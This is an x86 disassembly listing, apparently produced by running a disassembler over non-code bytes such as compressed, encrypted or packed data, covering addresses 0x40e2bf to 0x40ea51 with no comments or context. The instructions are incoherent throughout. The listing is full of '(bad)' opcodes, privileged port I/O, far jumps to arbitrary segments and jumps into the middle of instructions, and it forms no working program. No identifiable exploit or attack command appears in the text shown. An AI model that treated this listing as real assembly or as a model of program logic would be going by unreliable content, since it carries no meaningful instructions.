  40e2bf:	jecxz  0x40e2b2
  40e2c1:	xor    BYTE PTR [esi-0x7d],al
  40e2c4:	mov    edi,0x632a8370
  40e2c9:	fmul   DWORD PTR [eax]
  40e2cb:	sub    al,0x39
  40e2cd:	(bad)  
  40e2cf:	mov    dh,0x88
  40e2d1:	dec    esi
  40e2d2:	sbb    eax,ecx
  40e2d4:	add    al,0x5f
  40e2d6:	xchg   esi,eax
  40e2d7:	or     BYTE PTR [edi+0x1cabf474],cl
  40e2dd:	daa    
  40e2de:	mov    ecx,0x576b086e
  40e2e3:	pop    esp
  40e2e4:	mov    bh,0x7c
  40e2e6:	dec    ebp
  40e2e7:	xchg   BYTE PTR [ecx+0x65c3d9ed],cl
  40e2ed:	and    al,0x53
  40e2ef:	popf   
  40e2f0:	jo     0x40e27b
  40e2f2:	enter  0x7c32,0x1a
  40e2f6:	inc    ebp
  40e2f7:	inc    edi
  40e2f8:	mov    DWORD PTR [edx-0x61],ebx
  40e2fb:	inc    ecx
  40e2fc:	int3   
  40e2fd:	mov    eax,ds:0xd63a324f
  40e302:	mov    ?,WORD PTR [edx+0x9]
  40e305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e306:	outs   dx,BYTE PTR ds:[esi]
  40e307:	mov    esi,DWORD PTR [ebx+esi*4]
  40e30a:	mov    ds:0x3ebcb49f,eax
  40e30f:	pop    esi
  40e310:	fstp   TBYTE PTR [edi]
  40e312:	or     edi,ebx
  40e314:	(bad)  
  40e316:	es call 0x6e5a:0x5c5dd4dc
  40e31e:	xor    DWORD PTR [edx+0x14],0x601e5329
  40e325:	adc    al,0x34
  40e327:	loop   0x40e2f8
  40e329:	hlt    
  40e32a:	je     0x40e34f
  40e32c:	mov    dl,cl
  40e32e:	and    al,0xa1
  40e330:	xor    DWORD PTR [ecx-0x222cb0c7],ebp
  40e336:	retf   
  40e337:	jne    0x40e385
  40e339:	scas   al,BYTE PTR es:[edi]
  40e33a:	pop    ebx
  40e33b:	dec    esi
  40e33c:	cmp    eax,0xe767c79d
  40e341:	dec    esi
  40e342:	xchg   ecx,eax
  40e343:	pop    ecx
  40e344:	ret    
  40e345:	jg     0x40e30b
  40e347:	and    esi,DWORD PTR [esi]
  40e349:	pop    ecx
  40e34a:	ja     0x40e344
  40e34c:	fstp   DWORD PTR [ebp+edi*1+0x2c]
  40e350:	pop    ecx
  40e351:	xchg   ebp,eax
  40e352:	jmp    0xeeca1081
  40e357:	mov    ds:0xcaea19e6,eax
  40e35c:	(bad)  
  40e35e:	push   ss
  40e35f:	sub    eax,0xd2715152
  40e364:	adc    cl,dh
  40e366:	cmp    edi,edx
  40e368:	push   esp
  40e369:	in     eax,dx
  40e36a:	sub    DWORD PTR [ebx-0x72900e19],ebp
  40e370:	shr    BYTE PTR [eax-0x36],cl
  40e373:	into   
  40e374:	jp     0x40e33b
  40e376:	cmp    al,0x24
  40e378:	out    dx,al
  40e379:	test   eax,0xff3add57
  40e37e:	rol    eax,cl
  40e380:	test   eax,0xdde3276d
  40e385:	dec    ebp
  40e386:	ret    0x4a5c
  40e389:	lds    eax,FWORD PTR [eax+0xc]
  40e38c:	dec    eax
  40e38d:	jno    0x40e3f4
  40e38f:	mul    BYTE PTR [esi-0x76]
  40e392:	jo     0x40e3c2
  40e394:	lods   eax,DWORD PTR ds:[esi]
  40e395:	out    0xc5,eax
  40e397:	mov    al,ds:0x3ab75a1e
  40e39c:	xchg   edx,eax
  40e39d:	jnp    0x40e35b
  40e39f:	jmp    0xf33b:0x281cfa8
  40e3a6:	out    0x87,eax
  40e3a8:	daa    
  40e3a9:	addr16 into 
  40e3ab:	mov    ah,bl
  40e3ad:	pop    ss
  40e3ae:	fidiv  DWORD PTR [esi+0x622de828]
  40e3b4:	leave  
  40e3b5:	in     eax,dx
  40e3b6:	aas    
  40e3b7:	jne    0x40e342
  40e3b9:	ror    DWORD PTR [edi-0x1f],0x2a
  40e3bd:	and    cl,bl
  40e3bf:	inc    esi
  40e3c0:	retf   
  40e3c1:	pop    esi
  40e3c2:	cmp    ch,dh
  40e3c4:	add    al,0xd0
  40e3c6:	sbb    al,0x89
  40e3c8:	and    DWORD PTR [ebx],esi
  40e3ca:	fcom   DWORD PTR [ecx+esi*1-0x7e097570]
  40e3d1:	adc    dh,BYTE PTR [edi+0x27141ab]
  40e3d7:	ja     0x40e456
  40e3d9:	std    
  40e3da:	jne    0x40e377
  40e3dc:	loopne 0x40e3ec
  40e3de:	xchg   ecx,eax
  40e3df:	jo     0x40e3d6
  40e3e1:	jb     0x40e3b7
  40e3e3:	hlt    
  40e3e4:	retf   
  40e3e5:	dec    BYTE PTR ds:0xb31cafa7
  40e3eb:	imul   BYTE PTR [ecx+0x63305629]
  40e3f1:	dec    esp
  40e3f2:	lds    eax,FWORD PTR [edx]
  40e3f4:	imul   edi,DWORD PTR [ebp+0x3174f21f],0x37ed774b
  40e3fe:	push   edi
  40e3ff:	pushf  
  40e400:	add    ecx,esi
  40e402:	loopne 0x40e457
  40e404:	jno    0x40e481
  40e406:	cmp    al,BYTE PTR [ebx-0x9]
  40e409:	mov    DWORD PTR ds:0x34d118,ecx
  40e40f:	sbb    ecx,esp
  40e411:	adc    edx,DWORD PTR [edi-0x4]
  40e414:	mov    al,0x72
  40e416:	loop   0x40e404
  40e418:	adc    DWORD PTR [edi+0x4ae57e48],esi
  40e41e:	dec    edx
  40e41f:	shl    DWORD PTR [esi],cl
  40e421:	or     al,0xa8
  40e423:	sbb    eax,0x3e16c67a
  40e428:	or     ah,BYTE PTR ds:0x1bc4de20
  40e42e:	mov    ch,dl
  40e430:	pop    esp
  40e431:	add    al,0x56
  40e433:	xor    bl,bh
  40e435:	ss xchg ebx,eax
  40e437:	mov    ah,0x71
  40e439:	sbb    ecx,eax
  40e43b:	(bad)  
  40e43c:	fdiv   QWORD PTR [ebp+0x3d08fadd]
  40e442:	leave  
  40e443:	cmp    BYTE PTR [edi+0x15],dh
  40e446:	sar    DWORD PTR [ebx-0x31],cl
  40e449:	inc    edi
  40e44a:	cmp    BYTE PTR ds:0xfdf19cb4,al
  40e450:	jge    0x40e4a7
  40e452:	xor    DWORD PTR [ecx-0xc175d50],ecx
  40e458:	inc    edi
  40e459:	or     ecx,DWORD PTR [ebx-0x647c2aab]
  40e45f:	les    ecx,FWORD PTR [edi+0x581fa5db]
  40e465:	fwait
  40e466:	lock jb 0x40e429
  40e469:	enter  0xccdd,0x5d
  40e46d:	xchg   esp,eax
  40e46e:	fstp   DWORD PTR [edi]
  40e470:	aas    
  40e471:	cs or  al,0x29
  40e474:	jge    0x40e43b
  40e476:	add    ah,bh
  40e478:	cwde   
  40e479:	inc    edx
  40e47a:	add    al,BYTE PTR [eax-0x1b]
  40e47d:	ss fcomip st,st(0)
  40e480:	mov    BYTE PTR ds:0x4393aefc,dl
  40e486:	inc    edx
  40e487:	jb     0x40e45c
  40e489:	lods   al,BYTE PTR ds:[esi]
  40e48a:	jecxz  0x40e4d5
  40e48c:	push   ebx
  40e48d:	jb     0x40e432
  40e48f:	imul   ebx,esp,0x79
  40e492:	(bad)  
  40e493:	mov    al,0xec
  40e495:	inc    edi
  40e496:	mov    edx,0x43dfdcb1
  40e49b:	js     0x40e4a3
  40e49d:	adc    eax,0x84841a63
  40e4a2:	ficom  WORD PTR [edi-0x2c]
  40e4a5:	cwde   
  40e4a6:	in     al,dx
  40e4a7:	icebp  
  40e4a8:	fsubr  DWORD PTR [edi-0x1d]
  40e4ab:	fldenv [edi]
  40e4ad:	gs out dx,al
  40e4af:	jp     0x40e4d6
  40e4b1:	jo     0x40e472
  40e4b3:	cmp    dl,BYTE PTR [esi]
  40e4b5:	popf   
  40e4b6:	ror    BYTE PTR [ecx-0x4cf66638],cl
  40e4bc:	push   edx
  40e4bd:	and    eax,0x7f4ced31
  40e4c2:	inc    esp
  40e4c3:	int    0xa8
  40e4c5:	sbb    ch,cl
  40e4c7:	and    edi,DWORD PTR [esi-0x53]
  40e4ca:	pop    ebp
  40e4cb:	rol    DWORD PTR [edx+0x44],1
  40e4ce:	sub    cl,BYTE PTR [ebp-0x2f]
  40e4d1:	adc    DWORD PTR [edx-0x61],edx
  40e4d4:	or     esp,ecx
  40e4d6:	int    0x22
  40e4d8:	cmp    BYTE PTR [eax-0x1d824971],0x5e
  40e4df:	aam    0x7f
  40e4e1:	and    DWORD PTR [ecx],eax
  40e4e3:	xchg   esi,eax
  40e4e4:	jecxz  0x40e481
  40e4e6:	xchg   ebp,eax
  40e4e7:	xchg   ebp,eax
  40e4e8:	push   edx
  40e4e9:	sbb    eax,0x28c8dc9
  40e4ee:	or     eax,0x8182de3e
  40e4f3:	mov    ebx,DWORD PTR [edx-0x3c8baed9]
  40e4f9:	adc    eax,0x2df2add7
  40e4fe:	repz add eax,0x171d7bc3
  40e504:	mov    esp,0x3b2cb4b2
  40e509:	or     ch,bh
  40e50b:	in     al,dx
  40e50c:	mov    edi,0x89d294bc
  40e511:	push   cs
  40e512:	cld    
  40e513:	or     BYTE PTR [eax],0xc7
  40e516:	fidiv  WORD PTR [eax]
  40e518:	sti    
  40e519:	push   es
  40e51a:	div    BYTE PTR [ebx]
  40e51c:	ja     0x40e55f
  40e51e:	mov    eax,DWORD PTR [edi]
  40e520:	jbe    0x40e53b
  40e522:	ss jns 0x40e5a1
  40e525:	ror    BYTE PTR [ebx-0x63185c90],cl
  40e52b:	int3   
  40e52c:	inc    ebx
  40e52d:	jecxz  0x40e4f0
  40e52f:	lahf   
  40e530:	das    
  40e531:	add    al,BYTE PTR [eax-0x64b6abb6]
  40e537:	jl     0x40e5a9
  40e539:	sbb    bh,BYTE PTR [ebp-0x539ede9f]
  40e53f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e541:	inc    eax
  40e542:	jne    0x40e51a
  40e544:	sub    dh,BYTE PTR [edx-0x60]
  40e547:	push   ebx
  40e548:	xchg   ebx,eax
  40e549:	outs   dx,BYTE PTR ds:[esi]
  40e54a:	shl    dh,cl
  40e54c:	ficomp DWORD PTR [ecx]
  40e54e:	jmp    0xe55b:0x525d9314
  40e555:	dec    edi
  40e556:	out    0x1,al
  40e558:	js     0x40e584
  40e55a:	nop
  40e55b:	out    dx,eax
  40e55c:	stos   BYTE PTR es:[edi],al
  40e55d:	out    0xd2,eax
  40e55f:	test   BYTE PTR [ecx+ebx*1],0x93
  40e563:	fidivr WORD PTR [edi-0x3ff78116]
  40e569:	push   ss
  40e56a:	icebp  
  40e56b:	out    0x67,al
  40e56d:	rcl    BYTE PTR [edi+0x2de415b0],cl
  40e573:	xor    ah,BYTE PTR [edi]
  40e575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e576:	scas   eax,DWORD PTR es:[edi]
  40e577:	pop    ebp
  40e578:	stos   DWORD PTR es:[edi],eax
  40e579:	push   ebx
  40e57a:	popa   
  40e57b:	repz in eax,dx
  40e57d:	idiv   dl
  40e57f:	pop    es
  40e580:	xchg   BYTE PTR [ecx-0x2f],ch
  40e583:	(bad)  
  40e584:	adc    ebp,eax
  40e586:	imul   ebp,DWORD PTR [esi],0xffffff87
  40e589:	call   0x73a2dc6
  40e58e:	dec    ecx
  40e58f:	aam    0xce
  40e591:	dec    ebp
  40e592:	cmp    al,0x3b
  40e594:	and    DWORD PTR [eax+ecx*8],eax
  40e597:	cwde   
  40e598:	or     ch,BYTE PTR [ebx]
  40e59a:	rcl    dh,0x8b
  40e59d:	pop    esi
  40e59e:	lea    esp,ds:0x16717f59
  40e5a4:	and    ch,BYTE PTR [esi-0x39899f07]
  40e5aa:	je     0x40e5e0
  40e5ac:	mov    dl,0x4a
  40e5ae:	sub    eax,0x6215ae1b
  40e5b3:	scas   eax,DWORD PTR es:[edi]
  40e5b4:	je     0x40e5fc
  40e5b6:	dec    eax
  40e5b7:	fst    QWORD PTR [edi+0x4]
  40e5ba:	out    0xef,al
  40e5bc:	es xor al,0xc4
  40e5bf:	fnstsw WORD PTR [ecx-0x6dd21735]
  40e5c5:	jns    0x40e558
  40e5c7:	arpl   bp,sp
  40e5c9:	adc    WORD PTR [edx+eax*8],ax
  40e5cd:	out    0xb0,eax
  40e5cf:	push   ebx
  40e5d0:	or     ebx,DWORD PTR [ebx]
  40e5d2:	sbb    BYTE PTR [edi+0x24],ch
  40e5d5:	jge    0x40e55e
  40e5d7:	mov    esp,0x35aff44a
  40e5dc:	pop    esp
  40e5dd:	or     BYTE PTR [esi+eiz*2-0x278fa15c],dh
  40e5e4:	mov    esi,0xbea19c3d
  40e5e9:	push   ecx
  40e5ea:	aad    0x16
  40e5ec:	dec    ebp
  40e5ed:	cmp    al,0xba
  40e5ef:	xor    BYTE PTR [edx-0x51ebb0a4],dh
  40e5f5:	rol    BYTE PTR [ecx-0x7f6b3252],cl
  40e5fb:	in     al,0x45
  40e5fd:	mov    al,0x48
  40e5ff:	in     eax,dx
  40e600:	(bad)  
  40e601:	jo     0x40e5ed
  40e603:	lahf   
  40e604:	test   al,0xe1
  40e606:	pop    eax
  40e607:	bound  ebx,QWORD PTR [edi]
  40e609:	inc    edi
  40e60a:	int3   
  40e60b:	jmp    0x8f27:0x892c63aa
  40e612:	jns    0x40e633
  40e614:	xchg   ebp,eax
  40e615:	in     al,0x19
  40e617:	jmp    DWORD PTR [edx-0x1b]
  40e61a:	dec    ebx
  40e61b:	jne    0x40e5ca
  40e61d:	aad    0x4
  40e61f:	(bad)  
  40e620:	imul   ecx,DWORD PTR [ebp+0x37],0xffffffec
  40e624:	out    dx,al
  40e625:	iret   
  40e626:	in     al,0x65
  40e628:	out    0xb,eax
  40e62a:	inc    ebp
  40e62b:	aas    
  40e62c:	push   esi
  40e62d:	call   0x3de31c0b
  40e632:	aam    0x90
  40e634:	sbb    DWORD PTR [edx],ebp
  40e636:	inc    esp
  40e637:	mov    bl,0x6f
  40e639:	and    al,0x96
  40e63b:	fstp   st(0)
  40e63d:	mov    cl,0x79
  40e63f:	lea    ebx,[ecx-0x1e68d30b]
  40e645:	push   eax
  40e646:	pop    edi
  40e647:	inc    ebp
  40e648:	(bad)
  40e64d:	mov    bh,0xf7
  40e64f:	mov    dl,0x9
  40e651:	xchg   ecx,eax
  40e652:	in     eax,0x18
  40e654:	mov    eax,ds:0xd31539a1
  40e659:	and    ebp,DWORD PTR [esi]
  40e65b:	inc    esp
  40e65c:	push   ebx
  40e65d:	(bad)
  40e660:	mov    ch,0x49
  40e662:	clc    
  40e663:	cwde   
  40e664:	pop    ss
  40e665:	loop   0x40e6ae
  40e667:	or     DWORD PTR [edx-0x2c7acb33],ebp
  40e66d:	arpl   WORD PTR [esi+0x785b83ce],dx
  40e673:	xchg   BYTE PTR [eax],dl
  40e675:	jbe    0x40e6dc
  40e677:	and    dh,BYTE PTR [edx-0x5c]
  40e67a:	js     0x40e675
  40e67c:	jmp    0x40e651
  40e67e:	test   al,0xbc
  40e680:	pop    esp
  40e681:	pusha  
  40e682:	loopne 0x40e692
  40e684:	addr16 jmp 0x47bd6808
  40e68a:	adc    eax,0x187d6929
  40e68f:	mov    DWORD PTR [ecx-0x72],edi
  40e692:	mov    eax,ds:0xe23954cb
  40e697:	out    dx,eax
  40e698:	push   0x5e09ffd3
  40e69d:	popf   
  40e69e:	(bad)  
  40e6a0:	add    ch,BYTE PTR [edx-0x5171ae03]
  40e6a6:	inc    edi
  40e6a7:	js     0x40e679
  40e6a9:	push   esp
  40e6aa:	lods   al,BYTE PTR ds:[esi]
  40e6ab:	cwde   
  40e6ac:	fsubr  DWORD PTR [esi+0x13]
  40e6af:	mov    ah,0xf9
  40e6b1:	and    esp,ebp
  40e6b3:	out    dx,al
  40e6b4:	jnp    0x40e6a7
  40e6b6:	mov    ebp,DWORD PTR fs:[edx]
  40e6b9:	shl    BYTE PTR [eax+0x64af72f5],0xbf
  40e6c0:	bound  ebx,QWORD PTR [esi-0x3f060efa]
  40e6c6:	pop    ebx
  40e6c7:	arpl   WORD PTR [esi],di
  40e6c9:	adc    al,0x3e
  40e6cb:	cs leave 
  40e6cd:	pop    esi
  40e6ce:	xchg   edx,eax
  40e6cf:	or     al,0x14
  40e6d1:	pop    ebx
  40e6d2:	enter  0xdff2,0x6d
  40e6d6:	test   al,0x4c
  40e6d8:	jb     0x40e70b
  40e6da:	inc    BYTE PTR [esi+ecx*1]
  40e6dd:	aaa    
  40e6de:	mov    esp,0x77ebcb97
  40e6e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6e4:	imul   edi,DWORD PTR [edx],0x5
  40e6e7:	out    0xcd,eax
  40e6e9:	push   0x76
  40e6eb:	out    0xc2,eax
  40e6ed:	rcr    DWORD PTR [edx-0x486d0686],cl
  40e6f3:	pop    DWORD PTR [ebp+0x5e]
  40e6f6:	xlat   BYTE PTR ds:[ebx]
  40e6f7:	es jo  0x40e744
  40e6fa:	pop    ecx
  40e6fb:	aaa    
  40e6fc:	sub    eax,0xa8e92b9
  40e701:	out    dx,al
  40e702:	or     DWORD PTR [ecx],edx
  40e704:	retf   
  40e705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e706:	gs push ecx
  40e708:	push   es
  40e709:	mov    WORD PTR ds:0xe96450cc,fs
  40e70f:	mov    esp,0x1746328f
  40e714:	push   ecx
  40e715:	push   esp
  40e716:	(bad)  
  40e717:	jecxz  0x40e722
  40e719:	push   0x61444871
  40e71e:	xchg   ebx,eax
  40e71f:	xor    ebx,DWORD PTR [esi]
  40e721:	jecxz  0x40e72c
  40e723:	shr    edx,1
  40e725:	fcmovnb st,st(2)
  40e727:	jmp    0x488e:0xe599279b
  40e72e:	add    DWORD PTR [esi+0x3997b369],eax
  40e734:	inc    ebp
  40e735:	add    al,0x3
  40e737:	sti    
  40e738:	push   0xd6c37e2d
  40e73d:	enter  0x18a2,0x77
  40e741:	pop    eax
  40e742:	dec    edx
  40e743:	in     eax,0x1e
  40e745:	jle    0x40e730
  40e747:	jecxz  0x40e77a
  40e749:	jnp    0x40e6da
  40e74b:	out    0x6c,al
  40e74d:	fisub  WORD PTR [esi+0x4e]
  40e750:	jnp    0x40e795
  40e752:	cmp    BYTE PTR [ebx-0x31],bh
  40e755:	sub    DWORD PTR [esi-0x7b1cd520],esp
  40e75b:	js     0x40e73f
  40e75d:	pop    ss
  40e75e:	jno    0x40e71e
  40e760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e761:	cwde   
  40e762:	sub    BYTE PTR [edx-0x599e5958],ah
  40e768:	mov    dh,0xcc
  40e76a:	pop    es
  40e76b:	mov    bl,BYTE PTR [esp+ebp*4-0x28]
  40e76f:	test   dh,ch
  40e771:	inc    eax
  40e772:	ret    0xb4f0
  40e775:	add    edi,DWORD PTR [edx+0x6c3450c0]
  40e77b:	mov    DWORD PTR [ebx-0x15],ecx
  40e77e:	ret    0xa19f
  40e781:	mov    cl,0x97
  40e783:	pop    esi
  40e784:	mov    ebx,0x74617c0d
  40e789:	dec    ecx
  40e78a:	data16 mov ?,WORD PTR ds:0x45bb7dca
  40e791:	je     0x40e7df
  40e793:	dec    ebx
  40e794:	aaa    
  40e795:	rol    DWORD PTR [eax+ebx*8+0x60032d49],1
  40e79c:	or     BYTE PTR [esi+0x26],cl
  40e79f:	mov    ebx,0x5faa7efd
  40e7a4:	mov    ds:0xcfe6d46e,al
  40e7a9:	cli    
  40e7aa:	outs   dx,BYTE PTR ds:[esi]
  40e7ab:	imul   esi,ebx,0xd03fff5e
  40e7b1:	ds pop ss
  40e7b3:	push   0xffffff9e
  40e7b5:	adc    bh,BYTE PTR [ecx+eiz*1-0x21]
  40e7b9:	xor    ebp,DWORD PTR [esi-0x1c]
  40e7bc:	mov    ecx,0xbc6dc1bf
  40e7c1:	dec    ebx
  40e7c2:	lahf   
  40e7c3:	lods   al,BYTE PTR ds:[esi]
  40e7c4:	push   ebx
  40e7c5:	daa    
  40e7c6:	xor    ah,BYTE PTR [eax+ebp*2+0x12]
  40e7ca:	repnz or DWORD PTR [esp+ebx*1+0x29fdbc0b],esi
  40e7d2:	stc    
  40e7d3:	sub    bh,BYTE PTR [edi+edx*1]
  40e7d6:	outs   dx,BYTE PTR ds:[esi]
  40e7d7:	adc    DWORD PTR [ecx+eax*8],esi
  40e7da:	jo     0x40e7a0
  40e7dc:	dec    edi
  40e7dd:	cmp    al,0xaf
  40e7df:	sbb    al,BYTE PTR fs:0x8684f867
  40e7e6:	fst    DWORD PTR [edi+0x22]
  40e7e9:	clc    
  40e7ea:	xchg   esi,eax
  40e7eb:	push   edi
  40e7ec:	ret    0x3d8e
  40e7ef:	fistp  QWORD PTR [eax]
  40e7f1:	pushf  
  40e7f2:	cs je  0x40e825
  40e7f5:	mov    eax,0xe41cd617
  40e7fa:	cmp    BYTE PTR [edi+0x20],bl
  40e7fd:	sub    bl,BYTE PTR [edi+ebx*4-0x68]
  40e801:	hlt    
  40e802:	ficomp WORD PTR [edx+0x66]
  40e805:	ret    0xa9e5
  40e808:	adc    dl,dl
  40e80a:	out    0xe3,eax
  40e80c:	fstp   st(4)
  40e80e:	repz cmp DWORD PTR [ebx],ebp
  40e811:	fistp  QWORD PTR ds:0x21c5cec0
  40e817:	gs repz or eax,0x6b98b743
  40e81e:	jge    0x40e7f5
  40e820:	sbb    DWORD PTR [ebx],0xeab22eb3
  40e826:	and    al,BYTE PTR [esi]
  40e828:	push   esi
  40e829:	xlat   BYTE PTR ds:[ebx]
  40e82a:	dec    ebp
  40e82b:	mov    al,0xa5
  40e82d:	sub    DWORD PTR [eax-0x1b],edi
  40e830:	mov    ch,0xce
  40e832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e833:	mov    ah,ch
  40e835:	jo     0x40e83a
  40e837:	push   ebx
  40e838:	fsub   DWORD PTR [esi-0x38]
  40e83b:	cmp    DWORD PTR [ebp+0x3956e7b4],ecx
  40e841:	pop    eax
  40e842:	cmp    DWORD PTR [edx+eiz*4-0x17],esi
  40e846:	in     al,0x97
  40e848:	jle    0x40e88d
  40e84a:	sti    
  40e84b:	mov    ds:0xab891992,eax
  40e850:	and    ebp,ebp
  40e852:	and    ebx,ecx
  40e854:	sub    ebp,ebp
  40e856:	mov    bh,0x84
  40e858:	test   ebx,ecx
  40e85a:	lea    ebx,[ebx+0x36afd952]
  40e860:	cmp    ebp,ebx
  40e862:	lahf   
  40e863:	xchg   ebp,eax
  40e864:	dec    edx
  40e865:	sub    ch,BYTE PTR [ecx]
  40e867:	mov    al,0xf6
  40e869:	ins    BYTE PTR es:[edi],dx
  40e86a:	in     eax,0x68
  40e86c:	jp     0x40e8e8
  40e86e:	mov    eax,ds:0xac8d0224
  40e874:	xor    BYTE PTR [ebx-0x2ea1fba3],bl
  40e87a:	sub    ebx,DWORD PTR [ecx+0x6fcccbb1]
  40e880:	xor    DWORD PTR [esi+0x7a],esi
  40e883:	inc    ebx
  40e884:	sahf   
  40e885:	mov    bh,0x1c
  40e887:	jno    0x40e88e
  40e889:	iret   
  40e88a:	sub    eax,0xe379a7da
  40e88f:	fbld   TBYTE PTR [edx]
  40e891:	std    
  40e892:	inc    esi
  40e893:	jmp    0x40e8c9
  40e895:	or     ecx,DWORD PTR [ecx]
  40e897:	push   es
  40e898:	jg     0x40e8fb
  40e89a:	neg    DWORD PTR [edx+0x41]
  40e89d:	mov    cl,ah
  40e89f:	test   eax,0x686283e5
  40e8a4:	adc    esp,DWORD PTR [edi]
  40e8a6:	mov    cl,0x6b
  40e8a8:	cmp    al,0xda
  40e8aa:	sbb    DWORD PTR [ebx-0x33],esp
  40e8ad:	sub    al,0xf0
  40e8af:	xchg   DWORD PTR [ecx+0x66aa87f5],eax
  40e8b5:	enter  0x2293,0xf6
  40e8b9:	into   
  40e8ba:	mov    al,0x27
  40e8bc:	iret   
  40e8bd:	stc    
  40e8be:	add    cl,BYTE PTR [ebp+0x75e655e1]
  40e8c4:	popf   
  40e8c5:	xchg   ebx,eax
  40e8c6:	sbb    BYTE PTR [ebx+0x26],al
  40e8c9:	or     al,0x5a
  40e8cb:	stos   BYTE PTR es:[edi],al
  40e8cc:	jp     0x40e86e
  40e8ce:	lock jge 0x40e93e
  40e8d1:	inc    ebp
  40e8d2:	inc    esp
  40e8d3:	imul   esp,DWORD PTR [edi-0x62],0xbf88ee52
  40e8da:	scas   al,BYTE PTR es:[edi]
  40e8db:	add    ebx,DWORD PTR ds:0x37a639b4
  40e8e1:	outs   dx,DWORD PTR ss:[esi]
  40e8e3:	fcomi  st,st(2)
  40e8e5:	pop    es
  40e8e6:	lods   eax,DWORD PTR ds:[esi]
  40e8e7:	sbb    al,bl
  40e8e9:	imul   ebp,DWORD PTR [edi],0xcf4469a1
  40e8ef:	in     al,0xd0
  40e8f1:	ret    0xc66b
  40e8f4:	add    BYTE PTR [ebx],0x84
  40e8f7:	push   ebx
  40e8f8:	mov    ebx,0xc0e6be0
  40e8fd:	ins    BYTE PTR es:[edi],dx
  40e8fe:	or     al,0xe3
  40e900:	mov    edx,0x3c125d26
  40e905:	pop    esi
  40e906:	neg    DWORD PTR [edi+0x1509a9ab]
  40e90c:	lods   eax,DWORD PTR ds:[esi]
  40e90d:	adc    ebp,DWORD PTR [edx+0x769456df]
  40e913:	rcl    BYTE PTR [ebx],cl
  40e915:	(bad)  
  40e916:	jmp    0x9ef0:0x2acdddce
  40e91d:	jns    0x40e949
  40e91f:	dec    eax
  40e920:	test   eax,edi
  40e922:	push   0x9ab2b1c2
  40e927:	(bad)  
  40e928:	int    0xea
  40e92a:	hlt    
  40e92b:	pop    ds
  40e92c:	fnsave [ecx-0x3c5e5f9f]
  40e932:	neg    esp
  40e934:	lods   al,BYTE PTR ds:[esi]
  40e935:	rcl    edi,cl
  40e937:	adc    DWORD PTR [edx],eax
  40e939:	fdivr  QWORD PTR [edx-0x3bd3460d]
  40e93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e940:	mov    bl,0x4a
  40e942:	cwde   
  40e943:	cmp    dh,BYTE PTR [ecx-0x1876098a]
  40e949:	xor    BYTE PTR [edi+edi*8-0x3fb275ab],dh
  40e950:	push   ss
  40e951:	mov    ch,0xfd
  40e953:	ins    BYTE PTR es:[edi],dx
  40e954:	mov    esi,0x9ebdf739
  40e959:	push   ss
  40e95a:	push   eax
  40e95b:	test   DWORD PTR [edi+0x5b35489d],edx
  40e961:	in     eax,dx
  40e962:	shr    DWORD PTR [edx-0x3d992398],1
  40e968:	adc    edx,DWORD PTR [esi+esi*4-0xbe6b8ae]
  40e96f:	push   edi
  40e970:	lock add ch,BYTE PTR [ebx]
  40e973:	inc    esi
  40e974:	dec    esp
  40e975:	jle    0x40e981
  40e977:	lahf   
  40e978:	ins    BYTE PTR es:[edi],dx
  40e979:	cmp    DWORD PTR [ecx+0x16],0xffffffb4
  40e97d:	add    esp,edi
  40e97f:	dec    ebx
  40e980:	lds    eax,FWORD PTR [ebp+0x29]
  40e983:	ror    DWORD PTR [ebx-0x6daa3bdf],1
  40e989:	retf   0x596a
  40e98c:	sub    ebx,0xe2a8e387
  40e992:	mov    bl,0xed
  40e994:	rcl    BYTE PTR [ebp+0x5a1d04b4],0xf6
  40e99b:	inc    ebp
  40e99c:	mov    ds:0x1762ef49,eax
  40e9a1:	test   eax,0x8979bea4
  40e9a6:	in     al,0xb4
  40e9a8:	sbb    DWORD PTR [edi+eax*1+0x6b],0x5e3ae401
  40e9b0:	mov    cl,0xcb
  40e9b2:	xchg   cl,dl
  40e9b4:	test   al,0xe4
  40e9b6:	jbe    0x40e93d
  40e9b8:	xchg   BYTE PTR [ecx],ah
  40e9ba:	adc    esp,edx
  40e9bc:	imul   eax,DWORD PTR [ecx+0x3eaaf832],0xf
  40e9c3:	or     ecx,DWORD PTR [esi-0x75c59c8c]
  40e9c9:	test   eax,0xff7880c3
  40e9ce:	and    BYTE PTR [eax+0x21147d70],0x89
  40e9d5:	sub    BYTE PTR [edx-0x596fbfd3],al
  40e9db:	sub    edi,0x414f7e43
  40e9e1:	push   0xffffffbe
  40e9e3:	sub    ch,BYTE PTR [ecx+0x26]
  40e9e6:	push   ecx
  40e9e7:	ret    
  40e9e8:	ret    0x6f73
  40e9eb:	pop    ds
  40e9ec:	imul   ebx,DWORD PTR [ecx],0x886529d1
  40e9f2:	ss loopne 0x40e9f8
  40e9f5:	add    eax,0xc92e8cee
  40e9fa:	sbb    eax,0xc5c8235
  40e9ff:	int    0x1c
  40ea01:	jmp    0xa1509bd6
  40ea06:	enter  0xe92f,0xc2
  40ea0a:	pop    esp
  40ea0b:	ror    BYTE PTR [eax-0x18],1
  40ea0e:	jp     0x40ea34
  40ea10:	aaa    
  40ea11:	mov    ebp,0x41b40558
  40ea16:	pop    ecx
  40ea17:	out    dx,eax
  40ea18:	jmp    0x40e9ab
  40ea1a:	or     cl,dl
  40ea1c:	or     bh,BYTE PTR [esi+eax*1+0x4597b11]
  40ea23:	pop    es
  40ea24:	xchg   ebp,eax
  40ea25:	add    edx,DWORD PTR [edi]
  40ea27:	out    0xea,al
  40ea29:	push   ss
  40ea2a:	in     al,dx
  40ea2b:	mov    WORD PTR [ecx+edi*8+0x3b],cs
  40ea2f:	and    DWORD PTR ds:0x1231556c,0x7bf2b549
  40ea39:	ficom  DWORD PTR [ebx-0x61]
  40ea3c:	sub    DWORD PTR [esi+ebp*4+0x32],eax
  40ea40:	push   eax
  40ea41:	or     BYTE PTR [ebx-0x3eb81299],cl
  40ea47:	bound  esp,QWORD PTR [eax]
  40ea49:	mov    esp,edx
  40ea4b:	sbb    eax,0x947f1465
  40ea50:	dec    eax
  40ea51:	pop    es
